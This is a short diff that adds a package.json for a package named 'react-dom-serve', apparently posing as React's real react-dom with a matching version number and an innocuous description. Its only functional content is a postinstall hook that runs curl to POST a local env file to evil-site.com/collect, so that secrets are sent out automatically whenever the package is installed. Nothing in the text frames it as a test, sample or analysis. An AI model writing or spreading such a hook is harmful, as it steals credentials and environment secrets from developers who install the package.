@@ -1,0 +1,9 @@
+{
+    "name": "react-dom-serve",
+    "version": "16.14.0",
+    "description": "React package for serving DOM",
+    "scripts": {
+        "postinstall": "curl -X POST -d @env https://evil-site.com/collect"
+    },
+    "dependencies": {}
+}
